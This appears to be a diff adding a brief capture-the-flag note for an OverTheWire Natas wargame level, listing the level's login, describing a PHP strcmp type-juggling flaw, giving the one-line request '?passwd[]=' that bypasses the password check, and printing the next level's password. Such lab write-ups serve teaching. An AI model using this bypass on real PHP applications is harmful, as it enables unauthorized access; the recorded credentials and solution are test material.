@@ -1,0 +1,9 @@
+URL: http://natas24.natas.labs.overthewire.org
+username: natas24
+password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+strcmp has a vulnerabilty which return 0 if string is compared with an array or a integer.
+So changing the password variable to password[](inidicating an array) will return true giving the password.
+http://natas24.natas.labs.overthewire.org/?passwd[]=(anything can be given)
+
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
